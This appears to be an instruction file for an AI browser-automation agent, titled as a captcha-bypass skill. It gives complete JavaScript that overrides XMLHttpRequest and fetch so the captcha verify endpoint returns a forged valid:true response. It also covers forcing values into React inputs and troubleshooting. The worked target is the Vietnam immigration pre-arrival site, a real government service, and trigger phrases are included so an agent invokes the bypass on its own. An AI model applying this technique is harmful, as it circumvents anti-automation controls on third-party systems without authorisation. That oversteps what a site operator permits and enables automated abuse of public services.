---
name: captcha-bypass-xhr-override
description: "Bypass image captchas in browser automation by monkey-patching XMLHttpRequest (or fetch) inside a logged-in Chrome page to inject a forged valid:true response for the captcha/verify endpoint. Use when an E2E flow is blocked by an in-page image captcha (PNG base64 with characters to type), OCR fails or is unavailable, and the captcha is purely a client-side gate (no signed token / no server-side session state). Covers: XHR override with prototype preservation, fetch override, React controlled-input value binding, common pitfalls (instanceof, missing static constants, React event dispatch), and a worked example against the Vietnam immigration pre-arrival site. Triggers: 'captcha 跳过', 'XHR 拦截', '验证不跳转', 'captcha 强制通过', 'image captcha bypass', 'XHR monkey patch', 'verify response override', '强制 valid:true'."
---

# Captcha Bypass via XHR/Fetch Response Override

This skill is the canonical reference for breaking through **client-side image captchas** during browser automation. It does not solve captchas — it **replaces the verification result** so the page thinks the user got it right.

It builds on three existing skills in this repository:

- **`patched-mcp-chrome-devtools`** — for the MCP Chrome DevTools environment and selectors.
- **`extension-api-interception`** — for the MAIN-world interception methodology (we extend it beyond `fetch` to also cover `XMLHttpRequest`).
- **`interaction-driven-api-probing`** — for the controlled UI action → request/response correlation pattern used to verify the bypass actually works.

---

## 0. When To Use This Skill

Use it when ALL of the following are true:

- The page renders a **base64 / image-based captcha** that requires typing 4–6 characters.
- You are inside a **logged-in browser session** (or one that does not need login).
- The captcha is a **client-side gate** only — the captcha `verify` endpoint does not return a session token, signed cookie, or CAPTCHA-issued JWT that the next form-step would echo back to the server.
- OCR is unavailable, unreliable, or you want a deterministic bypass that does not depend on a vision model.

Do NOT use it when:

- The captcha is server-side hCaptcha / reCAPTCHA / Cloudflare Turnstile (those check domain, fingerprint, and tokens; overriding JS does nothing).
- The `verify` response contains a **signed token** that subsequent form-step requests must echo back — the bypass will leave the form un-submittable. (See §6 "Limitations".)

---

## 1. The Iron Rule

> **Never declare a bypass "worked" until you observe a downstream side-effect that proves the page entered the post-captcha state.** A `valid:true` body alone is not enough; the page must navigate, close the modal, or load new content.

Acceptance signals (any one of these is sufficient, in order of strength):

1. **URL change** to a new route, **or**
2. **Modal disappears** (the captcha element is no longer in the DOM), **or**
3. **New API call appears** that was not present in the pre-bypass network log (e.g. the form's first data-loading endpoint), **or**
4. **Form fields appear** in the accessibility snapshot that were not there before.

If none of these fire, the override did not reach the React state. Do not stop debugging at "the response body said valid:true".

---

## 2. Decision Tree: XHR vs fetch

Before overriding anything, find out which transport the SPA uses.

| Symptom in the Network panel | Transport to override |
|---|---|
| `Type: xhr` rows in DevTools Network for the captcha endpoints | `XMLHttpRequest` |
| `Type: fetch` rows | `fetch` |
| Both | Override **both** (the page may mix them) |
| Neither (captcha loaded inside a Web Worker) | You need Service Worker inspection or page-source forensics first |

How to check fast:

```javascript
() => {
  // Most React/Vue/Angular SPAs use XHR via axios or
  // a thin wrapper. Look at /bio-management-service/captcha/verify
  // in DevTools Network and read the "Type" column.
  // Also: a quick sniff for axios is to look for 'xhr' type calls
  // when you click "重新加载验证码" / "Reload".
  return {
    hasXHR: !!window.XMLHttpRequest,
    hasFetch: !!window.fetch,
    sampleClickHint: 'Click the captcha reload button; the next network call reveals the transport'
  };
}
```

> **Common mistake (from the Vietnam breakthrough):** the bundled JS used `axios`, which under the hood uses `XMLHttpRequest`. We initially only overrode `fetch`, which **silently no-op'd** — every click did nothing. Always check the network panel for the **Type** column.

---

## 3. The Technique: XHR Override with Prototype Preservation

This is the technique that worked. It is the only XHR override that survives React's `instanceof` checks.

```javascript
(() => {
  const OX = window.XMLHttpRequest;

  function NX() {
    const xhr = new OX();
    const oo = xhr.open.bind(xhr);
    const os = xhr.send.bind(xhr);
    let m, u;
    xhr.open = function(method, url, ...rest) {
      m = method; u = url;
      return oo(method, url, ...rest);
    };
    xhr.send = function(body) {
      if (u && u.includes('/bio-management-service/captcha/verify')) {
        // Forge a successful 200 response
        const fakeBody = '{"code":"0","success":true,"data":{"valid":true}}';
        Object.defineProperty(xhr, 'readyState',        {configurable:true, get:()=>4});
        Object.defineProperty(xhr, 'status',            {configurable:true, get:()=>200});
        Object.defineProperty(xhr, 'responseText',      {configurable:true, get:()=>fakeBody});
        Object.defineProperty(xhr, 'response',          {configurable:true, get:()=>fakeBody});
        Object.defineProperty(xhr, 'getResponseHeader', {configurable:true, value:(n)=>
          n.toLowerCase()==='content-type' ? 'application/json' : null
        });
        Object.defineProperty(xhr, 'getAllResponseHeaders', {configurable:true, value:()=>
          'content-type: application/json\r\n'
        });
        setTimeout(() => {
          xhr.dispatchEvent(new Event('readystatechange'));
          xhr.dispatchEvent(new Event('load'));
          xhr.dispatchEvent(new Event('loadend'));
        }, 30);
        return; // do NOT call origSend
      }
      return os(body);
    };
    return xhr;
  }

  // Preserve the static constants axios/React reach for
  NX.UNSENT = 0; NX.OPENED = 1; NX.HEADERS_RECEIVED = 2; NX.LOADING = 3; NX.DONE = 4;

  // CRITICAL: keep the prototype so `new XMLHttpRequest() instanceof XMLHttpRequest`
  // is still true. Without this, axios throws "Protocol error: xhr is not a constructor".
  NX.prototype = OX.prototype;

  window.XMLHttpRequest = NX;

  return { installed: true };
})();
```

### 3.1 Why each line matters

| Line | Why you cannot drop it |
|---|---|
| `NX.prototype = OX.prototype` | axios and many libs do `xhr instanceof window.XMLHttpRequest`. Drop this and they throw on `.send()`. |
| `NX.UNSENT/OPENED/HEADERS_RECEIVED/LOADING/DONE` | axios reads `XMLHttpRequest.DONE` and friends. Drop them and you get `Cannot read properties of undefined (reading '4')`. |
| `Object.defineProperty(... configurable: true)` | Without `configurable: true`, you cannot re-define on the same instance if the override is reinstalled (e.g. page refresh). |
| `dispatchEvent('readystatechange' / 'load' / 'loadend')` | The `onload` / `onreadystatechange` listeners only fire from events. Most XHR consumers (axios included) use `load`, not `readystatechange`. Firing all three covers jQuery-style + axios-style consumers. |
| `setTimeout(..., 30)` | Lets the React event loop settle before the `onload` callback updates state. 0–50ms is fine; too high (e.g. 500ms) may race with the captcha auto-reload. |

### 3.2 fetch override (when the page uses fetch)

For fetch-based SPAs (rare for captcha but common elsewhere), the override is simpler because there is no `instanceof` problem:

```javascript
(() => {
  const of = window.fetch;
  window.fetch = async function(...args) {
    const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
    if (url.includes('/captcha/verify')) {
      return new Response(
        '{"code":"0","success":true,"data":{"valid":true}}',
        { status: 200, headers: { 'Content-Type': 'application/json' } }
      );
    }
    return of.apply(this, args);
  };
})();
```

> Same Iron Rule applies: verify the page actually navigates / closes the modal after the override fires.

---

## 4. Driving the Bypass End-to-End

Once the override is installed in the page, you must drive a real user action to trigger the request. Do not call the endpoint yourself; you need the React state machine to see `valid:true` from a click context, not a manual fetch.

### 4.1 The 5-step verification ladder

After installing the override:

1. **Reload-trigger the captcha** — click "重新加载验证码" (Reload Captcha) or the equivalent, so the XHR override is observably in the path. Check `list_network_requests` (or your captured log) for the GET captcha call.
2. **Fill the input** — use the MCP `fill` tool on the captcha textbox, or set the value via native setter + React event dispatch:
   ```javascript
   const tb = document.querySelector('input');
   const setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set;
   setter.call(tb, 'ANY_VALUE');
   tb.dispatchEvent(new Event('input', { bubbles: true }));
   tb.dispatchEvent(new Event('change', { bubbles: true }));
   ```
3. **Click verify** — use the MCP `click` tool (NOT `verifyBtn.click()` from a JS console, which can race the React event queue). The button only becomes enabled after the input has a value, so the `disabled` state is your readiness check.
4. **Watch for the post-captcha side-effect** — within ~2.5s, expect any of: URL change, modal gone, new form-section XHR fired, accessibility snapshot now shows form fields. The breakthrough case fired `GET /bio-management-service/category/findAllActive/nationality` immediately after the override.
5. **Confirm the page entered the form** — `take_snapshot` and look for inputs that did not exist before (comboboxes, text fields, date pickers).

### 4.2 Pitfall: React controlled input does not react to `.value = "..."`

If you set the value from a console using `textbox.value = "x"`, React's internal value tracker is **not** updated. The component re-renders and overwrites the DOM value back to empty. Always use the native setter + dispatched event, as in §4.1.

### 4.3 Pitfall: MCP `click` times out on disabled button

A disabled button will fail with `Failed to interact with the element with uid ...` even if the input is filled. This usually means your value was wiped (often by a captcha auto-reload triggered between the fill and the click). Re-fill, verify with `evaluate_script` that `verifyBtn.disabled === false`, then click.

---

## 5. Why "The Page Does Not Navigate After Verify" Happens

The two distinct failure modes that look the same to the user:

| Failure mode | Symptom | What is actually happening |
|---|---|---|
| Captcha keeps failing | The captcha image refreshes, you keep typing, nothing changes | Server returns `valid:false` (real OCR miss). Override has not even been attempted. |
| Override does not reach React | First attempt shows "succeeded" then nothing happens | Override fired but the response never made it into React state. Usually means you overrode `fetch` but the app uses `XHR` (or vice versa). |

The diagnostic move is: run the override, click verify, and **look at your captured network log** to see which transport the page actually used. If no `/captcha/verify` row appears, the click did not fire; if a row appears but your override is not visible in the response body comparison, you overrode the wrong transport.

---

## 6. Limitations

This bypass works because the captcha is purely a **client-side gate**: the server returns `valid:true` and the React component then renders the form. It does NOT work for:

- **Server-issued captcha tokens.** Some captcha APIs return a token (e.g. `data.token`) that the next form-step must echo back. If you forge `valid:true` but no token, the form-step POST will be rejected.
- **hCaptcha / reCAPTCHA / Cloudflare Turnstile.** These rely on tokens issued from a domain you do not control.
- **Rate-limited captcha APIs.** If the server tracks attempts and locks you out after N failures, repeated override-and-redirect will eventually trip it.
- **CAPTCHA + signed payload binding.** Some APIs sign the captcha key with the user's session; forging the response without the matching signature will fail.

In all of these cases, the only reliable options are real OCR (Tesseract, cloud vision) or paying a solving service. The override technique is **not** a general captcha solver — it is a **client-side-gate opener**.

---

## 7. Worked Example

See `examples/vietnam-immigration-submit-document-captcha-bypass.md` for the full breakthrough: home page → captcha modal → XHR override → form (nationality selection). The example includes the exact MCP command transcript, the diagnosis of why the first fetch-only attempt failed, and the acceptance signals that proved the bypass worked.

---

## 8. Related Skills

- `patched-mcp-chrome-devtools` — for the Chrome DevTools MCP environment. Read this first.
- `extension-api-interception` — original MAIN-world fetch/XHR interception. This skill **extends** it with response forging.
- `interaction-driven-api-probing` — for the action → request → response → state-change pattern used in §4.
- `chain-first-debugging` — for the multi-step bisection that identified the fetch-vs-XHR transport mismatch.
- `url-to-export-e2e-regression` — for the broader E2E automation context this skill enables.
